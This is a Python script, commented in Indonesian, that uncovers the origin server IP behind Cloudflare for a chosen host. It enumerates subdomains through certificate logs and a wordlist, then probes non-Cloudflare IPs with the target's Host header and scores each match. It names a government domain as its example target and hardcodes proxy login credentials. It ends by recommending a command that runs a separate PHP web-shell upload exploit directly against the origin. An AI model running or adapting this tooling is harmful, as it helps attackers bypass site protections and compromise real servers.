#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
hunt_origin.py — cari IP origin di belakang Cloudflare untuk SATU host target.
Probe memakai SNI/Host = host target, lalu skor berdasarkan kecocokan konten vs baseline.
"""
import argparse, ipaddress, json, re, socket, threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
import requests, urllib3

urllib3.disable_warnings()

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) origin-hunter/1.0"
PROXY = "http://user23:CVSLAN5rbQsB@proxy.hypeproxy.site:1023"

CF = [ipaddress.ip_network(n) for n in [
    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13", "104.24.0.0/14",
    "108.162.192.0/18", "131.0.72.0/22", "141.101.64.0/18", "162.158.0.0/15", "172.64.0.0/13",
    "173.245.48.0/20", "188.114.96.0/20", "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
    "2400:cb00::/32", "2606:4700::/32", "2803:f800::/32", "2405:b500::/32", "2405:8100::/32",
    "2a06:98c0::/29", "2c0f:f248::/32",
]]


def is_cf(ip):
    try:
        a = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return any(a in n for n in CF)


# --- pin per-thread supaya aman dipakai dari ThreadPoolExecutor ---
_ORIG = socket.getaddrinfo
_TL = threading.local()


def _gai(h, *a, **k):
    return _ORIG(getattr(_TL, "pin", {}).get(h, h), *a, **k)


socket.getaddrinfo = _gai


def pin(host, ip):
    _TL.pin = {host: ip}


def unpin():
    _TL.pin = {}


def resolve(h):
    out = set()
    try:
        for _, _, _, _, sa in _ORIG(h, None):
            out.add(sa[0])
    except socket.gaierror:
        pass
    return out


def title_of(html):
    m = re.search(r"<title[^>]*>(.*?)</title>", html, re.S | re.I)
    return re.sub(r"\s+", " ", m.group(1)).strip() if m else ""


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--enum-domain", default=None,
                    help="domain untuk enumerasi CT (default: host target, mis. baznas.go.id)")
    ap.add_argument("--workers", type=int, default=24)
    ap.add_argument("--timeout", type=float, default=8)
    ap.add_argument("--proxy", action="store_true")
    ap.add_argument("-o", "--output", default="origin_candidates.json")
    args = ap.parse_args()

    tgt = args.target if "//" in args.target else "https://" + args.target
    host = urlparse(tgt).hostname
    enum = args.enum_domain or host

    session = requests.Session()
    session.verify = False
    session.headers["User-Agent"] = UA
    if args.proxy:
        session.proxies = {"http": PROXY, "https": PROXY}

    print(f"[*] target host : {host}")
    print(f"[*] enum domain : {enum}")

    try:
        r = session.get(tgt, timeout=15)
        base = {"status": r.status_code, "len": len(r.content), "title": title_of(r.text),
                "server": r.headers.get("Server"), "cf_ray": r.headers.get("CF-RAY")}
    except Exception as e:
        print(f"[!] baseline gagal: {e}")
        base = {"status": None, "len": 0, "title": "", "server": None, "cf_ray": None}
    print(f"[*] baseline: {base['status']} len={base['len']} title={base['title']!r} cf-ray={base['cf_ray']}")

    subs = set()
    try:
        j = requests.get(f"https://crt.sh/?q=%25.{enum}&output=json", timeout=60,
                         headers={"User-Agent": UA}).json()
        for e in j:
            for n in e.get("name_value", "").split("\n"):
                n = n.strip().lower().rstrip(".")
                if n and "*" not in n:
                    subs.add(n)
        print(f"[*] crt.sh: {len(subs)} nama")
    except Exception as e:
        print(f"[!] crt.sh gagal: {e}")

    for w in ["www", "mail", "smtp", "webmail", "cpanel", "api", "admin", "dev", "staging",
              "test", "intranet", "alpha14", "alpha2", "bucket-api", "portal", "cdn", "static",
              "app", "old", "new", "beta", "demo", "vpn", "sso", "login", "dashboard", "backend"]:
        subs.add(f"{w}.{enum}")
    subs.add(enum)

    print(f"[*] Resolving {len(subs)} nama subdomain...")
    ips = {}
    lock = threading.Lock()

    def resolve_sub(s):
        for ip in resolve(s):
            if not is_cf(ip) and not ip.startswith("127."):
                with lock:
                    ips.setdefault(ip, []).append(s)

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        list(ex.map(resolve_sub, sorted(subs)))

    print(f"[*] {len(ips)} IP unik non-Cloudflare -> probe dengan Host/SNI: {host}\n")

    def work(item):
        ip, names = item
        pin(host, ip)
        try:
            s = requests.Session()
            s.verify = False
            if args.proxy:
                s.proxies = {"http": PROXY, "https": PROXY}
            r = s.get(f"https://{host}/", timeout=args.timeout, allow_redirects=False,
                      headers={"User-Agent": UA})
            srv = r.headers.get("Server", "")
            hset = {k.lower() for k in r.headers}
            iscf = "cf-ray" in hset or "cloudflare" in srv.lower()
            t = title_of(r.text)
            score = 0
            if not iscf:
                score += 40
            if r.status_code == 200:
                score += 20
            if base["title"] and t and t.lower() == base["title"].lower():
                score += 40
            elif base["len"] and abs(len(r.content) - base["len"]) / max(base["len"], 1) < 0.2:
                score += 20
            if srv and "cloudflare" not in srv.lower():
                score += 10
            return {"ip": ip, "subs": names[:4], "status": r.status_code, "server": srv,
                    "title": t, "len": len(r.content), "cf": iscf, "score": score}
        except Exception as e:
            return {"ip": ip, "subs": names[:4], "error": str(e)[:70], "score": 0}
        finally:
            unpin()

    results = []
    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = [ex.submit(work, it) for it in ips.items()]
        for f in as_completed(futs):
            results.append(f.result())

    results.sort(key=lambda x: (-x["score"], x["ip"]))
    print("=== HASIL (skor tinggi = kandidat origin kuat) ===")
    for r in results[:40]:
        if "error" in r:
            print(f"  {r['score']:>3}  {r['ip']:<17} ERR {r['error']}")
        else:
            print(f"  {r['score']:>3}  {r['ip']:<17} {r['status']} {r['server'][:26]:<26} "
                  f"len={r['len']:<7} cf={r['cf']} {r['title'][:38]!r}")

    with open(args.output, "w", encoding="utf-8") as fh:
        json.dump({"target": tgt, "host": host, "baseline": base, "results": results},
                  fh, indent=2, ensure_ascii=False)
    print(f"\n[=] {args.output}")

    valid = [r for r in results if "error" not in r and r.get("score", 0) > 0]
    if valid:
        best = valid[0]
        print(f"\n[+] ORIGIN TERBAIK: {best['ip']} (Skor: {best['score']}, Server: {best['server']}, Status: {best['status']})")
        print("[+] Rekomendasi perintah exploit langsung ke origin:")
        print(f"    python find_php2shell_uploads.py --url {tgt} --origin-ip {best['ip']} --exploit --phase all --direct\n")


if __name__ == "__main__":
    main()